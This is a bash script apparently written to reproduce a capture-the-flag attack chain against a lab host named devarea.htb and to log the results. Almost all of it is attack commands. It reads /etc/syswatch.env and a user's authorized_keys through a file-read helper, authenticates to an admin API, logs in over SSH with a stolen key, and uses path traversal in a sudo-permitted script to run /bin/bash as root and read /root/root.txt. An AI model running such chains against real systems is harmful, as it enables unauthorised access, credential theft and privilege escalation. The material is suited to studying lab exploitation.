#!/usr/bin/env bash
set -u
OUT="/home/ctf/ctf/proof_output_clean.txt"
: > "$OUT"

run_cmd() {
  {
    echo "============================================================"
    printf '$'
    printf ' %q' "$@"
    echo
    echo "------------------------------------------------------------"
  } >> "$OUT"

  "$@" >> "$OUT" 2>&1
  local ec=$?
  echo "[exit_code]=$ec" >> "$OUT"
  echo >> "$OUT"
}

run_cmd date -u
run_cmd bash -lc "echo HEALTH && curl -sS -i --max-time 8 http://devarea.htb:8080/employeeservice | sed -n '1,20p'"
run_cmd bash -lc "python3 /home/ctf/ctf/xop_read.py file:///etc/syswatch.env --timeout 20 | sed -n '1,120p'"
run_cmd bash -lc "python3 /home/ctf/ctf/xop_read.py file:///home/dev_ryan/.ssh/authorized_keys --timeout 20 | sed -n '1,120p'"
run_cmd bash -lc "curl -sS -i -X POST http://devarea.htb:8888/api/token-auth -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"<HOVERFLY_ADMIN_PASSWORD_REDACTED>\"}' | sed -n '1,80p'"
run_cmd timeout 20 ssh -i /home/ctf/ctf/devarea_id_ed25519 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 dev_ryan@<TARGET_IP_REDACTED> id
run_cmd timeout 20 ssh -i /home/ctf/ctf/devarea_id_ed25519 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 dev_ryan@<TARGET_IP_REDACTED> whoami
run_cmd timeout 20 ssh -i /home/ctf/ctf/devarea_id_ed25519 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 dev_ryan@<TARGET_IP_REDACTED> hostname
run_cmd timeout 20 ssh -i /home/ctf/ctf/devarea_id_ed25519 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 dev_ryan@<TARGET_IP_REDACTED> sudo -l
run_cmd timeout 20 ssh -i /home/ctf/ctf/devarea_id_ed25519 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 dev_ryan@<TARGET_IP_REDACTED> sudo /opt/syswatch/syswatch.sh plugins
run_cmd timeout 20 ssh -i /home/ctf/ctf/devarea_id_ed25519 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 dev_ryan@<TARGET_IP_REDACTED> sudo /opt/syswatch/syswatch.sh logs --list
run_cmd timeout 20 ssh -i /home/ctf/ctf/devarea_id_ed25519 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 dev_ryan@<TARGET_IP_REDACTED> sudo /opt/syswatch/syswatch.sh plugin ../../../../bin/bash -c id
run_cmd timeout 20 ssh -i /home/ctf/ctf/devarea_id_ed25519 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 dev_ryan@<TARGET_IP_REDACTED> sudo /opt/syswatch/syswatch.sh logs ../../root/root.txt

echo "Proof run complete: $OUT"
